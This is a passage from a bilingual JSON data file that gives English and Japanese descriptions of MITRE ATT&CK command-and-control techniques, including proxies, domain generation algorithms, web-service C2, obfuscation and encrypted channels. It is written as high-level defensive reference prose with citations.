                        "description_eng": "Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",
                        "description_jp": "攻撃者は、外部プロキシを使用してネットワーク通信の中継役として機能させ、コマンドアンドコントロールサーバーへの直接接続を回避し、インフラストラクチャを隠蔽する可能性があります。[HTRAN](https://attack.mitre.org/software/S0040)、ZXProxy、ZXPortMapなど、プロキシやポートリダイレクトを介したトラフィックリダイレクトを可能にする多くのツールが存在します。(引用: Trend Micro APT Attack Tools) 攻撃者はこれらの種類のプロキシを使用して、コマンドアンドコントロール通信を管理したり、接続損失に直面した場合の回復力を提供したり、疑いを避けるために既存の信頼できる通信パスに乗ったりします。\n\n外部接続プロキシは、C2トラフィックの宛先を隠すために使用され、通常はポートリダイレクタで実装されます。被害者環境外の侵害されたシステムがこれらの目的に使用される場合もあれば、クラウドベースのリソースや仮想プライベートサーバーなどの購入済みインフラストラクチャが使用される場合もあります。プロキシは、侵害されたシステムからの接続が調査される可能性が低いことに基づいて選択される場合があります。被害者システムはインターネット上の外部プロキシと直接通信し、その後プロキシがC2サーバーに通信を転送します。"
                    }
                ]
            },
            {
                "id": "T1568",
                "name_eng": "Dynamic Resolution",
                "name_jp": "動的解決",
                "description_eng": "Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\n\nAdversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)",
                "description_jp": "攻撃者は、一般的な検出と修復を回避するために、コマンドアンドコントロールインフラストラクチャへの接続を動的に確立する可能性があります。これは、マルウェアが通信を受信するために使用するインフラストラクチャと共通のアルゴリズムを共有するマルウェアを使用することによって達成される場合があります。これらの計算は、マルウェアがコマンドアンドコントロールに使用するドメイン名、IPアドレス、またはポート番号などのパラメータを動的に調整するために使用できます。\n\n敵対者は、[フォールバックチャネル](https://attack.mitre.org/techniques/T1008)の目的で動的解決を使用することがあります。プライマリコマンドアンドコントロールサーバとの接触が失われた場合、マルウェアはコマンドアンドコントロールを再確立する手段として動的解決を採用することがあります。(引用：Talos CCleanup 2017)(引用：FireEye POSHSPY April 2017)(引用：ESET Sednit 2017 Activity)",
                "subtechniques": [
                    {
                        "id": "T1568.001",
                        "name_eng": "Fast Flux DNS",
                        "name_jp": "Fast Flux DNS",
                        "description_eng": "Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity)\n\nThe simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)\n\nIn contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.",
                        "description_jp": "攻撃者はFast Flux DNSを使用して、単一のドメイン解決にリンクされた急速に変化するIPアドレスの配列の背後にコマンドアンドコントロールチャネルを隠す可能性があります。このテクニックは、DNSリソースレコードのラウンドロビンIPアドレッシングと短いTime-To-Live（TTL）を組み合わせて使用し、複数のIPアドレスが割り当てられ、高頻度で交換される完全修飾ドメイン名を使用します。(引用: MehtaFastFluxPt1)(引用: MehtaFastFluxPt2)(引用: Fast Flux - Welivesecurity)\n\n最も単純な「シングルフラックス」メソッドは、単一のDNS名のDNS A（アドレス）レコードリストの一部としてアドレスを登録および登録解除することを含みます。これらの登録の平均寿命は5分であり、IPアドレス解決の絶え間ないシャッフルが生じます。(引用: Fast Flux - Welivesecurity)\n\n対照的に、「ダブルフラックス」メソッドは、DNSゾーンのDNSネームサーバーレコードリストの一部としてアドレスを登録および登録解除し、接続の回復力をさらに高めます。ダブルフラックスを使用すると、追加のホストがC2ホストへのプロキシとして機能し、C2チャネルの真のソースをさらに分離できます。"
                    },
                    {
                        "id": "T1568.002",
                        "name_eng": "Domain Generation Algorithms",
                        "name_jp": "ドメイン生成アルゴリズム",
                        "description_eng": "Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)\n\nDGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)\n\nAdversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)",
                        "description_jp": "攻撃者は、静的なIPアドレスやドメインのリストに頼るのではなく、ドメイン生成アルゴリズム（DGA）を利用して、コマンドアンドコントロールトラフィックの宛先ドメインを動的に特定する可能性があります。これにより、マルウェアが命令を確認できるドメインが数千存在する可能性があるため、防御側がコマンドアンドコントロールチャネルをブロック、追跡、または乗っ取ることがはるかに困難になるという利点があります。(引用: Cybereason Dissecting DGAs)(引用: Cisco Umbrella DGA)(引用: Unit 42 DGA Feb 2019)\n\nDGAは、各文字を生成することによってドメイン名を構築する場合、一見ランダムまたは「意味不明な」文字列（例：istgmxdejdnxuyla.ru）の形式をとることがあります。あるいは、一部のDGAは、文字の代わりに単語を連結することによって、単語全体を単位として使用します（例：cityjulydish.net）。多くのDGAは時間ベースであり、期間ごと（毎時、毎日、毎月など）に異なるドメインを生成します。その他には、防御側が将来のドメインを予測することをより困難にするために、シード値も組み込まれています。(引用: Cybereason Dissecting DGAs)(引用: Cisco Umbrella DGA)(引用: Talos CCleanup 2017)(引用: Akamai DGA Mitigation)\n\n敵対者は、[フォールバックチャネル](https://attack.mitre.org/techniques/T1008)の目的でDGAを使用することがあります。プライマリコマンドアンドコントロールサーバとの接触が失われた場合、マルウェアはコマンドアンドコントロールを再確立する手段としてDGAを採用することがあります。(引用：Talos CCleanup 2017)(引用：FireEye POSHSPY April 2017)(引用：ESET Sednit 2017 Activity)"
                    },
                    {
                        "id": "T1568.003",
                        "name_eng": "DNS Calculation",
                        "name_jp": "DNS計算",
                        "description_eng": "Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.(Citation: Meyers Numbered Panda)\n\nOne implementation of [DNS Calculation](https://attack.mitre.org/techniques/T1568/003) is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.(Citation: Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage)",
                        "description_jp": "攻撃者は、事前に決定されたポート番号や実際に返されたIPアドレスに頼るのではなく、DNS結果で返されたアドレスに対して計算を実行し、コマンドアンドコントロールに使用するポートとIPアドレスを決定する可能性があります。IPアドレスやポート番号の計算は、C2チャネルの出力フィルタリングをバイパスするために使用できます。(引用: Meyers Numbered Panda)\n\n[DNS計算](https://attack.mitre.org/techniques/T1568/003)の一つの実装は、DNS応答のIPアドレスの最初の3オクテットを取得し、それらの値を使用してコマンドアンドコントロールトラフィックのポートを計算することです。(引用：Meyers Numbered Panda)(引用：Moran 2014)(引用：Rapid7G20Espionage)"
                    }
                ]
            },
            {
                "id": "T1102",
                "name_eng": "Web Service",
                "name_jp": "Webサービス",
                "description_eng": "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites, cloud services, and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google, Microsoft, or Twitter, makes it easier for adversaries to hide in expected noise.(Citation: Broadcom BirdyClient Microsoft Graph API 2024) Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
                "description_jp": "攻撃者は、既存の正当な外部Webサービスを、侵害されたシステムとの間でデータを中継する手段として使用する可能性があります。人気のあるWebサイト、クラウドサービス、ソーシャルメディアがC2のメカニズムとして機能すると、侵害前にネットワーク内のホストが既にそれらと通信している可能性が高いため、かなりの隠れ蓑になる可能性があります。Google、Microsoft、Twitterなどが提供するような一般的なサービスを使用すると、攻撃者は予想されるノイズに紛れ込みやすくなります。(引用: Broadcom BirdyClient Microsoft Graph API 2024) Webサービスプロバイダーは一般的にSSL/TLS暗号化を使用しており、これにより攻撃者は追加の保護レベルを得られます。\n\nWebサービスの使用はまた、マルウェアバイナリ分析によるバックエンドC2インフラストラクチャの発見から保護し、同時に運用上の回復力を可能にする可能性があります（このインフラストラクチャは動的に変更される可能性があるため）。",
                "subtechniques": [
                    {
                        "id": "T1102.003",
                        "name_eng": "One-Way Communication",
                        "name_jp": "一方向通信",
                        "description_eng": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
                        "description_jp": "攻撃者は、Webサービスチャネル経由で戻り出力を受信せずに、侵害されたシステムにコマンドを送信する手段として、既存の正当な外部Webサービスを使用する可能性があります。侵害されたシステムは、コマンドアンドコントロール（C2）命令をホストするために、人気のあるWebサイトやソーシャルメディアを利用する可能性があります。これらの感染したシステムは、それらのコマンドからの出力を別のC2チャネル経由で送り返すか、別の個別のWebサービスに送信することを選択する場合があります。あるいは、攻撃者がシステムに命令を送信し、応答を望まない場合、侵害されたシステムはまったく出力を返さない場合があります。\n\nC2のメカニズムとして機能する人気のウェブサイトやソーシャルメディアは、侵害前にネットワーク内のホストが既にそれらと通信している可能性が高いため、かなりの隠れ蓑になる可能性があります。GoogleやTwitterなどが提供するような一般的なサービスを使用すると、攻撃者は予想されるノイズに紛れ込みやすくなります。ウェブサービスプロバイダーは一般的にSSL/TLS暗号化を使用しており、これにより攻撃者は追加の保護レベルを得られます。"
                    },
                    {
                        "id": "T1102.001",
                        "name_eng": "Dead Drop Resolver",
                        "name_jp": "デッドドロップリゾルバ",
                        "description_eng": "Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
                        "description_jp": "攻撃者は、既存の正当な外部Webサービスを使用して、追加のコマンドアンドコントロール（C2）インフラストラクチャを指す情報をホストする可能性があります。攻撃者は、デッドドロップリゾルバとして知られるコンテンツを、埋め込まれた（多くの場合、難読化/エンコードされた）ドメインまたはIPアドレスを含むWebサービスに投稿する可能性があります。感染すると、被害者はこれらのリゾルバに到達し、リダイレクトされます。\n\nC2のメカニズムとして機能する人気のウェブサイトやソーシャルメディアは、侵害前にネットワーク内のホストが既にそれらと通信している可能性が高いため、かなりの隠れ蓑になる可能性があります。GoogleやTwitterなどが提供するような一般的なサービスを使用すると、攻撃者は予想されるノイズに紛れ込みやすくなります。ウェブサービスプロバイダーは一般的にSSL/TLS暗号化を使用しており、これにより攻撃者は追加の保護レベルを得られます。\n\nデッドドロップリゾルバの使用はまた、マルウェアバイナリ分析によるバックエンドC2インフラストラクチャの発見から保護し、同時に運用上の回復力を可能にする可能性があります（このインフラストラクチャは動的に変更される可能性があるため）。"
                    },
                    {
                        "id": "T1102.002",
                        "name_eng": "Bidirectional Communication",
                        "name_jp": "双方向通信",
                        "description_eng": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
                        "description_jp": "攻撃者は、既存の正当な外部Webサービスを、Webサービスチャネルを介して侵害されたシステムにコマンドを送信し、そこから出力を受信する手段として使用する可能性があります。侵害されたシステムは、コマンドアンドコントロール（C2）命令をホストするために、人気のあるWebサイトやソーシャルメディアを利用する可能性があります。これらの感染したシステムは、その後、それらのコマンドからの出力をそのWebサービスチャネル経由で送り返すことができます。戻りトラフィックは、利用されているWebサービスに応じて、さまざまな方法で発生する可能性があります。例えば、戻りトラフィックは、侵害されたシステムがフォーラムにコメントを投稿したり、開発プロジェクトにプルリクエストを発行したり、Webサービスでホストされているドキュメントを更新したり、ツイートを送信したりする形をとる場合があります。\n\nC2のメカニズムとして機能する人気のウェブサイトやソーシャルメディアは、侵害前にネットワーク内のホストが既にそれらと通信している可能性が高いため、かなりの隠れ蓑になる可能性があります。GoogleやTwitterなどが提供するような一般的なサービスを使用すると、攻撃者は予想されるノイズに紛れ込みやすくなります。ウェブサービスプロバイダーは一般的にSSL/TLS暗号化を使用しており、これにより攻撃者は追加の保護レベルを得られます。"
                    }
                ]
            },
            {
                "id": "T1104",
                "name_eng": "Multi-Stage Channels",
                "name_jp": "多段階チャネル",
                "description_eng": "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\n\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\n\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.",
                "description_jp": "攻撃者は、異なる条件下または特定の機能のために使用されるコマンドアンドコントロールの複数の段階を作成する可能性があります。複数の段階を使用すると、コマンドアンドコントロールチャネルが難読化され、検出がより困難になる可能性があります。\n\nリモートアクセスツールは、指示のために最初の段階のコマンドアンドコントロールサーバーにコールバックします。最初の段階には、基本的なホスト情報を収集したり、ツールを更新したり、追加のファイルをアップロードしたりするための自動化された機能がある場合があります。その時点で、2番目のリモートアクセスツール（RAT）がアップロードされ、ホストを2番目の段階のコマンドアンドコントロールサーバーにリダイレクトする可能性があります。2番目の段階は、おそらくより完全に機能し、攻撃者がリバースシェルや追加のRAT機能を介してシステムと対話できるようにします。\n\n異なるステージは、重複するインフラストラクチャなしに、おそらく別々にホストされます。ローダーには、元の第1ステージ通信パスが発見されてブロックされた場合に備えて、バックアップの第1ステージコールバックまたは[フォールバックチャネル](https://attack.mitre.org/techniques/T1008)がある場合もあります。",
                "subtechniques": []
            },
            {
                "id": "T1001",
                "name_eng": "Data Obfuscation",
                "name_jp": "データ難読化",
                "description_eng": "Adversaries may obfuscate command and control traffic to make it more difficult to detect.(Citation: Bitdefender FunnyDream Campaign November 2020) Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.",
                "description_jp": "攻撃者は、検出をより困難にするためにコマンドアンドコントロールトラフィックを難読化する可能性があります。(引用: Bitdefender FunnyDream Campaign November 2020) コマンドアンドコントロール（C2）通信は、コンテンツの発見や解読をより困難にし、通信を目立たなくし、コマンドが見えないようにするために隠蔽されます（必ずしも暗号化されるわけではありません）。これには、プロトコルトラフィックへのジャンクデータの追加、ステガノグラフィの使用、正当なプロトコルの偽装など、多くの方法が含まれます。",
                "subtechniques": [
                    {
                        "id": "T1001.001",
                        "name_eng": "Junk Data",
                        "name_jp": "ジャンクデータ",
                        "description_eng": "Adversaries may add junk data to protocols used for command and control to make detection more difficult.(Citation: FireEye SUNBURST Backdoor December 2020) By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters.",
                        "description_jp": "攻撃者は、検出をより困難にするために、コマンドアンドコントロールに使用されるプロトコルにジャンクデータを追加する可能性があります。(引用: FireEye SUNBURST Backdoor December 2020) コマンドアンドコントロールに使用されるプロトコルにランダムまたは無意味なデータを追加することにより、攻撃者はトラフィックのデコード、解読、またはその他の分析のための簡単な方法を防ぐことができます。例としては、ジャンク文字でデータを付加/先頭に追加したり、重要な文字の間にジャンク文字を書き込んだりすることが含まれる場合があります。"
                    },
                    {
                        "id": "T1001.003",
                        "name_eng": "Protocol or Service Impersonation",
                        "name_jp": "プロトコルまたはサービスの偽装",
                        "description_eng": "Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. \n\nAdversaries may also leverage legitimate protocols to impersonate expected web traffic or trusted services. For example, adversaries may manipulate HTTP headers, URI endpoints, SSL certificates, and transmitted data to disguise C2 communications or mimic legitimate services such as Gmail, Google Drive, and Yahoo Messenger.(Citation: ESET Okrum July 2019)(Citation: Malleable-C2-U42)",
                        "description_jp": "攻撃者は、コマンドアンドコントロール活動を偽装し、分析作業を妨害するために、正当なプロトコルまたはWebサービストラフィックを偽装する可能性があります。正当なプロトコルまたはWebサービスを偽装することにより、攻撃者はコマンドアンドコントロールトラフィックを正当なネットワークトラフィックに紛れ込ませることができます。\n\n攻撃者は、偽のSSL/TLSハンドシェイクを偽装して、後続のトラフィックがSSL/TLS暗号化されているように見せかけ、一部のセキュリティツールを妨害したり、トラフィックが信頼できるエンティティに関連しているように見せかけたりする可能性があります。\n\n敵対者はまた、HTTPヘッダー、URIエンドポイント、SSL証明書、送信データを操作して、C2通信を偽装したり、Gmail、Google Drive、Yahoo Messengerなどの正当なサービスを模倣したりするなど、正当なプロトコルを利用する可能性もあります。(引用: ESET Okrum July 2019)(引用: Malleable-C2-U42)"
                    },
                    {
                        "id": "T1001.002",
                        "name_eng": "Steganography",
                        "name_jp": "ステガノグラフィ",
                        "description_eng": "Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.",
                        "description_jp": "攻撃者は、検出作業をより困難にするためにコマンドアンドコントロールトラフィックを隠すためにステガノグラフィ技術を使用する可能性があります。ステガノグラフィ技術は、システム間で転送されるデジタルメッセージにデータを隠すために使用できます。この隠された情報は、侵害されたシステムのコマンドアンドコントロールに使用できます。場合によっては、画像ファイルやドキュメントファイルなど、ステガノグラフィを使用して埋め込まれたファイルの受け渡しがコマンドアンドコントロールに使用されることがあります。"
                    }
                ]
            },
            {
                "id": "T1571",
                "name_eng": "Non-Standard Port",
                "name_jp": "非標準ポート",
                "description_eng": "Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\n\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.(Citation: change_rdp_port_conti)",
                "description_jp": "攻撃者は、通常関連付けられていないプロトコルとポートのペアリングを使用して通信する可能性があります。例えば、従来のポート443とは対照的に、ポート8088(引用: Symantec Elfin Mar 2019)またはポート587(引用: Fortinet Agent Tesla April 2018)経由のHTTPSなどです。攻撃者は、フィルタリングをバイパスしたり、ネットワークデータの分析/解析を混乱させたりするために、プロトコルで使用される標準ポートに変更を加える可能性があります。\n\n敵対者はまた、非標準ポートを悪用するために被害者システムに変更を加えるかもしれない。例えば、レジストリキーやその他の設定は、プロトコルとポートのペアリングを変更するために使用することができる。(引用：change_rdp_port_conti)",
                "subtechniques": []
            },
            {
                "id": "T1573",
                "name_eng": "Encrypted Channel",
                "name_jp": "暗号化チャネル",
                "description_eng": "Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
                "description_jp": "攻撃者は、通信プロトコルによって提供される固有の保護に頼るのではなく、暗号化アルゴリズムを使用してコマンドアンドコントロールトラフィックを隠蔽する可能性があります。安全なアルゴリズムを使用しているにもかかわらず、秘密鍵がマルウェアサンプル/構成ファイル内でエンコードおよび/または生成されている場合、これらの実装はリバースエンジニアリングに対して脆弱である可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1573.002",
                        "name_eng": "Asymmetric Cryptography",
                        "name_jp": "非対称暗号化",
                        "description_eng": "Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).",
                        "description_jp": "攻撃者は、通信プロトコルによって提供される固有の保護に頼るのではなく、既知の非対称暗号化アルゴリズムを使用してコマンドアンドコントロールトラフィックを隠蔽する可能性があります。公開鍵暗号方式としても知られる非対称暗号化は、パーティごとにキーペア（自由に配布できる公開鍵と秘密鍵）を使用します。キーの生成方法により、送信者は受信者の公開鍵でデータを暗号化し、受信者は秘密鍵でデータを復号化します。これにより、意図した受信者のみが暗号化されたデータを読み取ることができます。一般的な公開鍵暗号化アルゴリズムには、RSAやElGamalがあります。\n\n効率のため、多くのプロトコル（SSL/TLSを含む）は接続が確立されると対称暗号化を使用しますが、キーを確立または送信するために非対称暗号化を使用します。そのため、これらのプロトコルは[非対称暗号化](https://attack.mitre.org/techniques/T1573/002)として分類されます。"
                    },
                    {
                        "id": "T1573.001",
                        "name_eng": "Symmetric Cryptography",
                        "name_jp": "対称暗号化",
                        "description_eng": "Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
                        "description_jp": "攻撃者は、通信プロトコルによって提供される固有の保護に頼るのではなく、既知の対称暗号化アルゴリズムを使用してコマンドアンドコントロールトラフィックを隠蔽する可能性があります。対称暗号化アルゴリズムは、平文の暗号化と暗号文の復号化に同じキーを使用します。一般的な対称暗号化アルゴリズムには、AES、DES、3DES、Blowfish、RC4などがあります。"
                    }
                ]
            },
            {
                "id": "T1095",
                "name_eng": "Non-Application Layer Protocol",
                "name_jp": "非アプリケーション層プロトコル",
                "description_eng": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.(Citation: Microsoft ICMP) However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.\n\nIn ESXi environments, adversaries may leverage the Virtual Machine Communication Interface (VMCI) for communication between guest virtual machines and the ESXi host. This traffic is similar to client-server communications on traditional network sockets but is localized to the physical machine running the ESXi host, meaning it does not traverse external networks (routers, switches). This results in communications that are invisible to external monitoring and standard networking tools like tcpdump, netstat, nmap, and Wireshark. By adding a VMCI backdoor to a compromised ESXi host, adversaries may persistently regain access from any guest VM to the compromised ESXi host’s backdoor, regardless of network segmentation or firewall rules in place.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)",
                "description_jp": "攻撃者は、ホストとC2サーバー間、またはネットワーク内の感染したホスト間の通信にOSI非アプリケーション層プロトコルを使用する可能性があります。考えられるプロトコルのリストは広範です。(引用: Wikipedia OSI) 具体的な例としては、インターネット制御メッセージプロトコル（ICMP）などのネットワーク層プロトコル、ユーザーデータグラムプロトコル（UDP）などのトランスポート層プロトコル、ソケットセキュア（SOCKS）などのセッション層プロトコル、およびシリアルオーバーLAN（SOL）などのリダイレクト/トンネルプロトコルの使用が含まれます。\n\nホスト間のICMP通信はその一例です。(引用: Cisco Synful Knock Evolution) ICMPはインターネットプロトコルスイートの一部であるため、すべてのIP互換ホストで実装する必要があります。(引用: Microsoft ICMP) しかし、TCPやUDPなどの他のインターネットプロトコルほど一般的に監視されておらず、攻撃者が通信を隠すために使用する可能性があります。\n\nESXi環境では、攻撃者はゲスト仮想マシンとESXiホスト間の通信に仮想マシン通信インターフェイス（VMCI）を利用する可能性があります。このトラフィックは従来のネットワークソケット上のクライアントサーバー通信に似ていますが、ESXiホストを実行している物理マシンにローカライズされており、外部ネットワーク（ルーター、スイッチ）を通過しません。これにより、外部監視やtcpdump、netstat、nmap、Wiresharkなどの標準的なネットワークツールからは見えない通信になります。侵害されたESXiホストにVMCIバックドアを追加することにより、攻撃者は、ネットワークセグメンテーションやファイアウォールルールが設定されていても、任意のゲストVMから侵害されたESXiホストのバックドアに永続的に再アクセスできるようになる可能性があります。(引用: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)",
                "subtechniques": []
            },
            {
                "id": "T1132",
                "name_eng": "Data Encoding",
                "name_jp": "データエンコーディング",
                "description_eng": "Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",
                "description_jp": "攻撃者は、コマンドアンドコントロールトラフィックの内容を検出しにくくするためにデータをエンコードする可能性があります。コマンドアンドコントロール（C2）情報は、標準的なデータエンコーディングシステムを使用してエンコードできます。データエンコーディングの使用は、既存のプロトコル仕様に準拠する場合があり、ASCII、Unicode、Base64、MIME、またはその他のバイナリからテキストへの変換および文字エンコーディングシステムの使用が含まれます。(引用: Wikipedia Binary-to-text Encoding)(引用: Wikipedia Character Encoding) gzipなど、一部のデータエンコーディングシステムではデータ圧縮も行われる場合があります。",
                "subtechniques": [
                    {
                        "id": "T1132.001",
                        "name_eng": "Standard Encoding",
                        "name_jp": "標準エンコーディング",
